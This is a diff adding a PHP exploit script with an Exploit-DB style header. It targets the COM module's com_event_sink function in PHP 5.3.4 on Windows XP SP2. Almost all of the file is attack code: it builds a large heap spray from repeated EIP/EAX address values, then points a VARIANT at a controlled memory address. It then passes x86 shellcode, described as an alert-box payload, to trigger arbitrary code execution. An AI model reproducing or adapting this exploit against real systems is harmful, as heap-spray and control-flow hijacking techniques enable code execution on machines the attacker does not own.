@@ -1,0 +1,57 @@
+# Exploit Title: PHP 5.3.4 Win Com Module Com_sink Local Exploit
+# Google Dork: Nil
+# Date: 9/10/2012
+# Author: FB1H2S
+# Software Link: PHP Windows
+# Version: [5.3.4]
+# Tested on: Microsoft XP Pro 2002 SP2
+ 
+<?php
+ //PHP 5.3.4 
+ 
+ //
+//$eip ="\x44\x43\x42\x41";
+$eip= "\x4b\xe8\x57\x78";
+$eax ="\x80\x01\x8d\x04";
+$deodrant="";
+$axespray = str_repeat($eip.$eax,0x80);
+
+//048d0190
+echo strlen($axespray);
+echo  "PHP 5.3.4 WIN Com Module COM_SINK 0-day\n" ;
+echo  "By Rahul Sasi : http://twitter.com/fb1h2s\n" ;
+echo  "Exploit Tested on:\n Microsoft XP Pro 2002 SP2 \n" ;
+echo  "More Details Here:\n http://www.garage4hackers.com/blogs/8/web-app-remote-code-execution-via-scripting-engines-part-1-local-exploits-php-0-day-394/\n" ;
+
+
+//19200 ==4B32 4b00
+for($axeeffect=0;$axeeffect<0x4B32;$axeeffect++)
+{
+    $deodrant.=$axespray;
+}
+
+
+$terminate = "T";
+
+$u[] =$deodrant;
+
+$r[] =$deodrant.$terminate;
+$a[] =$deodrant.$terminate;
+$s[] =$deodrant.$terminate;
+
+ 
+//$vVar = new VARIANT(0x048d0038+$offset); // This is what we controll
+$vVar = new VARIANT(0x048d0000+180); 
+//alert box Shellcode 
+$buffer = "\x90\x90\x90".
+          "\xB9\x38\xDD\x82\x7C\x33\xC0\xBB".
+            "\xD8\x0A\x86\x7C\x51\x50\xFF\xd3";
+
+$var2 = new VARIANT(0x41414242);
+
+com_event_sink($vVar,$var2,$buffer);
+
+
+
+ 
+?>
